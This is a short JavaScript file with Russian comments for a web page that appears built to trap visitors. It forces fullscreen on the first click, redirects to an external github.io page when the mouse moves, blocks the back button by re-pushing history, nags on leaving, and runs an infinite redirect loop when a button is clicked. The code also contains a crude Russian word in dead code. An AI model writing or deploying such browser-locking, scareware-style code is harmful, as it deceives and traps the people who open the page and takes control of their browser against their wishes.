let fullscreenActivated = false;

// Fullscreen после первого взаимодействия
function activateFullscreen() {
    if (!fullscreenActivated) {
        const el = document.documentElement;
        if (el.requestFullscreen) el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        fullscreenActivated = true;
        document.getElementById("hint").style.display = "none";
    }
}

//window.location.href = "https://rsrchr1.github.io/uab/";
document.addEventListener("mousemove", (e) => {
  if (e.clientX > 500) {
    location.href = "https://rsrchr1.github.io/uab/";
  }
});
document.body.addEventListener("click", activateFullscreen);
document.body.addEventListener("touchstart", activateFullscreen);

// Блокировка кнопки "Назад"
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
};

// Предупреждение при закрытии
window.onbeforeunload = function () {
	while(true){
		return "Вы уверены, что хотите выйти?";
	}
	return "SOSI"
};

// Регистрация service worker (для PWA)
if ("serviceWorker" in navigator) {
    navigator.serviceWorker.register("service-worker.js");
}

document.getElementById("go").addEventListener("click", () => {
  activateFullscreen;
  while (true) {
	location.href = "https://rsrchr1.github.io/uab/";
  }
});